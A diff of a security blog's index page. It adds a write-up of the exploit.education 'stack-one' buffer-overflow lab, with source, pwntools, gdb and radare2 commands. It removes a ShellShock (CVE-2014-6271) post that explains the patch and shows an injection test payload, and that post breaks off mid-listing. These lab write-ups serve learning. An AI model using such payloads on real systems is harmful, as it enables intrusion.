@@ -197,6 +197,123 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://m0nst3r.me/re/pwn/exploit-education-stack-one.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0nst3r">
+      <meta itemprop="description" content="m0nst3r喜欢Web安全、渗透测试、网络安全、代码审计、逆向、编程，欢迎各位大表哥莅临指导。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="m0nst3r's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/re/pwn/exploit-education-stack-one.html" class="post-title-link" itemprop="url">exploit.education/stack-one</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2019-04-06 14:51:00" itemprop="dateCreated datePublished" datetime="2019-04-06T14:51:00+08:00">2019-04-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-06-03 18:46:42" itemprop="dateModified" datetime="2020-06-03T18:46:42+08:00">2020-06-03</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/category/re/" itemprop="url" rel="index"><span itemprop="name">re</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/category/re/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/re/pwn/exploit-education-stack-one.html" class="post-meta-item leancloud_visitors" data-flag-title="exploit.education/stack-one" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/re/pwn/exploit-education-stack-one.html#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="re/pwn/exploit-education-stack-one.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="源代码："><a href="#源代码：" class="headerlink" title="源代码："></a>源代码：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * phoenix/stack-one, by https://exploit.education</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The aim is to change the contents of the changeme variable to 0x496c5962</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Did you hear about the kid napping at the local school?</span></span><br><span class="line"><span class="comment"> * It's okay, they woke up.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BANNER \</span></span><br><span class="line">  <span class="string">"Welcome to "</span> LEVELNAME <span class="string">", brought to you by https://exploit.education"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">64</span>];</span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> changeme;</span><br><span class="line">  &#125; locals;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, BANNER);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">    errx(<span class="number">1</span>, <span class="string">"specify an argument, to be copied into the \"buffer\""</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  locals.changeme = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(locals.<span class="built_in">buffer</span>, argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (locals.changeme == <span class="number">0x496c5962</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Well done, you have successfully set changeme to the correct value"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Getting closer! changeme is currently 0x%08x, we want 0x496c5962\n"</span>,</span><br><span class="line">        locals.changeme);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>危险的<code>strcpy()</code>。结构体中的<code>changeme</code>变量会在进行<code>strcpy</code>时被溢出覆盖。记得<code>stack-zero</code>的目的，是改变<code>changeme</code>的值就会通过，但这个关卡要求我们必须将<code>changeme</code>改变成<code>0x496c5962</code>才行。<br>结构体<code>locals</code>包含两个成员，与<code>stack-zero</code>相同。64个字符+1个int。</p>
+<h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><p>首先，<code>strcpy</code>是从<code>argv[1]</code>中获取的输入，所以如果我们直接将输出传给<code>stack-one</code>，会出错：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">user@phoenix-amd64:~$ python -c <span class="string">"print 'A'*65"</span></span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">user@phoenix-amd64:~$ python -c <span class="string">"print 'A'*65"</span> | /opt/phoenix/amd64/stack-one </span><br><span class="line">Welcome to phoenix/stack-one, brought to you by https://exploit.education</span><br><span class="line">stack-one: specify an argument, to be copied into the <span class="string">"buffer"</span></span><br><span class="line">close failed <span class="keyword">in</span> file object destructor:</span><br><span class="line">sys.excepthook is missing</span><br><span class="line">lost sys.stderr</span><br></pre></td></tr></table></figure>
+
+<p>解决办法是用<code>xargs</code>命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user@phoenix-amd64:~$ python -c <span class="string">"print 'A'*65"</span> | xargs /opt/phoenix/amd64/stack-one </span><br><span class="line">Welcome to phoenix/stack-one, brought to you by https://exploit.education</span><br><span class="line">Getting closer! changeme is currently 0x00000041, we want 0x496c5962</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，我们将<code>changeme</code>改变为了<code>0x41</code>，即字符<code>A</code>。<br>接下来就简单了，只要构造<code>0x496c5962</code>就可以。<br>使用<code>pwntools</code>的<code>p32/p64</code>即可。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user@phoenix-amd64:~$ python -c <span class="string">"import pwn;print 'A'*64+pwn.p64(0x496c5962)"</span> | xargs /opt/phoenix/amd64/stack-one </span><br><span class="line">xargs: WARNING: a NUL character occurred <span class="keyword">in</span> the input.  It cannot be passed through <span class="keyword">in</span> the argument list.  Did you mean to use the --null option?</span><br><span class="line">Welcome to phoenix/stack-one, brought to you by https://exploit.education</span><br><span class="line">Well <span class="keyword">done</span>, you have successfully <span class="built_in">set</span> changeme to the correct value</span><br></pre></td></tr></table></figure>
+
+<h2 id="其他方式"><a href="#其他方式" class="headerlink" title="其他方式"></a>其他方式</h2><h3 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python -c "import pwn;print 'A'*64+pwn.p64(0x496c5962)"</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbYlI\x00\x00\x00\x00</span><br><span class="line">user@phoenix-amd64:~$ gdb /opt/phoenix/amd64/stack-one</span><br><span class="line">gef➤  run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbYlI</span><br><span class="line">Starting program: /opt/phoenix/amd64/stack-one AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbYlI</span><br><span class="line">Welcome to phoenix/stack-one, brought to you by https://exploit.education</span><br><span class="line">Well done, you have successfully set changeme to the correct value</span><br><span class="line">[Inferior 1 (process 9358) exited normally]</span><br></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef➤  set args AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbYlI</span><br><span class="line">gef➤  run</span><br><span class="line">Starting program: /opt/phoenix/amd64/stack-one AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbYlI</span><br><span class="line">Welcome to phoenix/stack-one, brought to you by https://exploit.education</span><br><span class="line">Well done, you have successfully set changeme to the correct value</span><br><span class="line">[Inferior 1 (process 9363) exited normally]</span><br></pre></td></tr></table></figure>
+
+<h3 id="radare2"><a href="#radare2" class="headerlink" title="radare2"></a>radare2</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">user@phoenix-amd64:~$ r2 /opt/phoenix/amd64/stack-one </span><br><span class="line"><span class="meta">[0x00400500]&gt;</span><span class="bash"> ood `!python -c <span class="string">"import pwn;print 'A'*64+pwn.p32(0x496c5962)"</span>`</span></span><br><span class="line">Process with PID 9383 started...</span><br><span class="line">File dbg:///opt/phoenix/amd64/stack-one  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbYlI reopened in read-only mode</span><br><span class="line">= attach 9383 9383</span><br><span class="line">Assuming filepath /opt/phoenix/amd64/stack-one</span><br><span class="line"><span class="meta">[0x7ffff7dc5d34]&gt;</span><span class="bash"> dc</span></span><br><span class="line">Welcome to phoenix/stack-one, brought to you by https://exploit.education</span><br><span class="line">Well done, you have successfully set changeme to the correct value</span><br><span class="line">PTRACE_EVENT_EXIT pid=9383, status=0x0</span><br><span class="line">= attach 9383 1</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>python的<code>pwntools</code>好用的很，相比gdb，radare2的用法好像更灵活。以后尽可能用两种工具都实操一下。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://m0nst3r.me/re/pwn/exploit-educatioin-stack-zero.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1185,140 +1302,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://m0nst3r.me/vuls/Bash%20ShellShock%20CVE-2014-6271(%E7%A0%B4%E5%A3%B3).html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="m0nst3r">
-      <meta itemprop="description" content="m0nst3r喜欢Web安全、渗透测试、网络安全、代码审计、逆向、编程，欢迎各位大表哥莅临指导。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="m0nst3r's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/vuls/Bash%20ShellShock%20CVE-2014-6271(%E7%A0%B4%E5%A3%B3).html" class="post-title-link" itemprop="url">Bash ShellShock CVE-2014-6271(破壳)</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2018-11-21 11:12:00" itemprop="dateCreated datePublished" datetime="2018-11-21T11:12:00+08:00">2018-11-21</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-06-03 18:46:42" itemprop="dateModified" datetime="2020-06-03T18:46:42+08:00">2020-06-03</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/category/vuls/" itemprop="url" rel="index"><span itemprop="name">vuls</span></a>
-                </span>
-            </span>
-
-          
-            <span id="/vuls/Bash%20ShellShock%20CVE-2014-6271(%E7%A0%B4%E5%A3%B3).html" class="post-meta-item leancloud_visitors" data-flag-title="Bash ShellShock CVE-2014-6271(破壳)" title="Views">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">Views: </span>
-              <span class="leancloud-visitors-count"></span>
-            </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/vuls/Bash%20ShellShock%20CVE-2014-6271(%E7%A0%B4%E5%A3%B3).html#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="vuls/Bash ShellShock CVE-2014-6271(破壳).html" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>[TOC]</p>
-<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题的是以<code>(){</code>开头定义的环境变量在命令<code>EVN</code>中解析成函数后，Bash执行并未推出，而是继续解析并执行shell命令。而其核心的原因在于输入的过滤中没有严格限制边界，也没有作出合法化的参数判断。</p>
-<p>在补丁中主要进行了参数的合法性过滤，补丁程序在<code>/builtins/evalstring.c</code>的<code>parse_and_execute</code>函数中对输入的合法性边界检测，将代码注入的可能性排除。在排除中，主要用到了<code>flag</code>的两次判断和<code>command</code>的一次类型匹配，为了能够<code>flag</code>判断准确，在补丁中预先定义了<code>SEVAL_FUNCDEF</code>、<code>SEVAL_ONECMD</code>两个标识作为判断依据。此漏洞的补丁更新有三处，主要进行输入的command进行过滤作用。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* /builtins/common.h */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEVAL_FUNCDEF 	0x080		<span class="comment">/* only allow function definitions */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEVAL_ONECMD 	0x100		<span class="comment">/* only allow a single command */</span></span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* /builtins/evalstring.c */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((flags &amp; SEVAL_FUNCDEF) &amp;&amp; command-&gt;type != cmd_function_def )</span><br><span class="line">	&#123;</span><br><span class="line">	internal_warning(<span class="string">"%s: ignoring function definition attempt"</span>, from_file);</span><br><span class="line">	should_jump_to_top_level = <span class="number">0</span>;</span><br><span class="line">	last_result = last_command_exit_value = EX_BADUSAGE;</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* /builtins/evalstring.c */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags &amp; SEVAL_ONECMD)</span><br><span class="line">	<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
-
-<p>从以上阐述的漏洞原理可知，漏洞的根本原因存在于Bash的<code>ENV</code>命令实现上，因此漏洞本身是不能够直接导致远程代码执行的。如果要达到远程代码执行的目的，必须借助第三方服务程序作为媒介才能够实现，第三方服务程序也必须要满足众多条件才可以充当此媒介的角色。例如，<code>apache2</code>便可以，其<code>CGI</code>组件满足远程访问并调用Bash的ENV命令进行访问数据解析功能。漏洞实现远程代码执行原理图如下：<br><img src="/images/db3f40e9f1e1a523c0dc165a926dab85bff11b09.png" alt="14139550048538.png"></p>
-<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p><code>VulApps/b/bash/shellshock1_CVE-2014-6271</code></p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="本地验证"><a href="#本地验证" class="headerlink" title="本地验证"></a>本地验证</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">m0nst3r@digapis:~/study/VulApps/b/bash/shellshock1_CVE-2014-6271$ docker run -t -i medicean/vulapps:b_bash_shellshock1 /bin/bash</span><br><span class="line">bash-4.3<span class="comment"># env x='() &#123; :;&#125;; echo Vulnerable' bash -c "echo test"                                                                                                  </span></span><br><span class="line">Vulnerable</span><br><span class="line"><span class="built_in">test</span></span><br><span class="line">bash-4.3<span class="comment"># uname -a</span></span><br><span class="line">Linux 65ce71c540ba 4.13.0-37-generic <span class="comment">#42~16.04.1-Ubuntu SMP Wed Mar 7 16:03:28 UTC 2018 x86_64 GNU/Linux</span></span><br><span class="line">bash-4.3<span class="comment"># cat /etc/issue       </span></span><br><span class="line">Debian GNU/Linux 8 \n \l</span><br><span class="line"></span><br><span class="line">bash-4.3<span class="comment"># /bin/bash --version</span></span><br><span class="line">GNU bash, version 4.3.24(1)-release (x86_64-unknown-linux-gnu)</span><br><span class="line">Copyright (C) 2013 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line"></span><br><span class="line">This is free software; you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line">bash-4.3<span class="comment">#</span></span><br></pre></td></tr></table></figure>
-
-<p>执行命令后，如果显示<code>Vulnerable</code>，证明系统存在漏洞，可改变<code>echo Vulnerable</code>为任意命令进行执行。</p>
-<h3 id="远程验证"><a href="#远程验证" class="headerlink" title="远程验证"></a>远程验证</h3><p>利用<code>VulApps</code>提供的Docker，看下目录结构：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash-4.3<span class="comment"># cd /usr/local/apache2/cgi-bin/</span></span><br><span class="line">bash-4.3<span class="comment"># ls</span></span><br><span class="line">poc.cgi  printenv  <span class="built_in">test</span>-cgi</span><br></pre></td></tr></table></figure>
-
-<p><code>poc.cgi</code>的内容：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">bash-4.3<span class="comment"># cat poc.cgi </span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Content-type: text/html"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">""</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;html&gt;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;head&gt;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8"&gt;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;title&gt;Bash ShellShock&lt;/title&gt;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;/head&gt;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;body&gt;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;pre&gt;'</span></span><br><span class="line">/usr/bin/env</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;/pre&gt;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;/body&gt;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;/html&gt;'</span></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure>
-
-<p><code>printenv</code>的内容：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">bash-4.3<span class="comment"># cat printenv </span></span><br><span class="line"><span class="comment">#!/usr/local/bin/perl</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment">##  printenv -- demo CGI program which just prints its environment</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">"Content-type: text/plain; charset=iso-8859-1\n\n"</span>;</span><br><span class="line">foreach <span class="variable">$var</span> (sort(keys(%ENV))) &#123;</span><br><span class="line">    <span class="variable">$val</span> = <span class="variable">$ENV</span>&#123;<span class="variable">$var</span>&#125;;</span><br><span class="line">    <span class="variable">$val</span> =~ s|\n|\\n|g;</span><br><span class="line">    <span class="variable">$val</span> =~ s|<span class="string">"|\\"</span>|g;</span><br><span class="line">    <span class="built_in">print</span> <span class="string">"<span class="variable">$&#123;var&#125;</span>=\"<span class="variable">$&#123;val&#125;</span>\"\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>test-cgi</code>的内容：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">bash-4.3<span class="comment"># cat test-cgi </span></span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># disable filename globbing</span></span><br><span class="line"><span class="built_in">set</span> -f</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Content-type: text/plain; charset=iso-8859-1"</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> CGI/1.0 <span class="built_in">test</span> script report:</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> argc is <span class="variable">$#</span>. argv is <span class="string">"$*"</span>.</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> SERVER_SOFTWARE = <span class="variable">$SERVER_SOFTWARE</span></span><br><span class="line"><span class="built_in">echo</span> SERVER_NAME = <span class="variable">$SERVER_NAME</span></span><br><span class="line"><span class="built_in">echo</span> GATEWAY_INTERFACE = <span class="variable">$GATEWAY_INTERFACE</span></span><br><span class="line"><span class="built_in">echo</span> SERVER_PROTOCOL = <span class="variable">$SERVER_PROTOCOL</span></span><br><span class="line"><span class="built_in">echo</span> SERVER_PORT = <span class="variable">$SERVER_PORT</span></span><br><span class="line"><span class="built_in">echo</span> REQUEST_METHOD = <span class="variable">$REQUEST_METHOD</span></span><br><span class="line"><span class="built_in">echo</span> HTTP_ACCEPT = <span class="string">"<span class="variable">$HTTP_ACCEPT</span>"</span></span><br><span class="line"><span class="built_in">echo</span> PATH_INFO = <span class="string">"<span class="variable">$PATH_INFO</span>"</span></span><br><span class="line"><span class="built_in">echo</span> PATH_TRANSLATED = <span class="string">"<span class="variable">$PATH_TRANSLATED</span>"</span></span><br><span class="line"><span class="built_in">echo</span> SCRIPT_NAME = <span class="string">"<span class="variable">$SCRIPT_NAME</span>"</span></span><br><span class="line"><span class="built_in">echo</span> QUERY_STRING = <span class="string">"<span class="variable">$QUERY_STRING</span>"</span></span><br><span class="line"><span class="built_in">echo</span> REMOTE_HOST = <span class="variable">$REMOTE_HOST</span></span><br><span class="line"><span class="built_in">echo</span> REMOTE_ADDR = <span class="variable">$REMOTE_ADDR</span></span><br><span class="line"><span class="built_in">echo</span> REMOTE_USER = <span class="variable">$REMOTE_USER</span></span><br><span class="line"><span class="built_in">echo</span> AUTH_TYPE = <span 